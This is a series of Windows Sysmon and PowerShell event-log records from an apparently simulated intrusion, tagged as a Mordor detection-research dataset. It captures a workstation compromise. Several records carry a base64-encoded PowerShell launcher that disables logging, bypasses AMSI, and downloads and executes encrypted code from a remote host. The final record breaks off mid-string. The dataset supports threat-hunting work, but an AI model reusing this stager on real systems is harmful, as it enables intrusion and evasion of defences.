{"ImageLoaded":"C:\\Windows\\System32\\cryptsp.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=90F229FB5DB52DF3604195B10C48E946684929ED,MD5=ACE18C6797090A1AA259BB8713917F98,SHA256=F5E118F67745792909973717FAE1F9FE68B2619332A4451AD04E0C9072B8D605,IMPHASH=A9B9D04D0B53DC48ABB37BE77AD01B55","SourceName":"Microsoft-Windows-Sysmon","Description":"Cryptographic Service Provider API","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4052,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.297Z","port":64545,"RecordNumber":3399251,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"cryptsp.dll","UtcTime":"2020-09-22 08:22:42.944","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\cryptbase.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b452-5f69-c502-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=B6093663113CF33A76156CB3F6D4322514F00E4B,MD5=26887DE7D7D1928F52A452E3A63E55E8,SHA256=EA86D9754164CA2C01B4A7F81188B2490CEE1F350E177861A4702C92DFD6D066,IMPHASH=3F27E242D68FC14338677A25FAE441F7","SourceName":"Microsoft-Windows-Sysmon","Description":"Base cryptographic API DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.298Z","port":64545,"RecordNumber":3399252,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"cryptbase.dll","UtcTime":"2020-09-22 08:22:42.959","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:     $adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28385\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=    $adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru\n \r\n\r\nDetails: \r\nCommandInvocation(Add-Type): \"Add-Type\"\r\nParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"using System;\nusing System.Runtime.InteropServices;\npublic static class priv\n{\n    [DllImport(\"shell32.dll\")]\n    public static extern bool IsUserAnAdmin();\n}\"\r\nParameterBinding(Add-Type): name=\"Language\"; value=\"CSharp\"\r\nParameterBinding(Add-Type): name=\"PassThru\"; value=\"True\"\r\n","@timestamp":"2020-09-22T08:22:44.298Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240725,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:           $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) \n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28387\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=50f3d352-332d-4cc2-9811-b903295a8adb\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=          $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) \n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"Security.Principal.WindowsPrincipal\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"System.Security.Principal.WindowsIdentity\"\r\n","@timestamp":"2020-09-22T08:22:44.299Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240726,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-AD84-2A856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":5092,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:42","@timestamp":"2020-09-22T08:22:44.299Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":213879,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 4c21984a-34d8-4d8e-8cf3-8ec0ea4212e8\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMA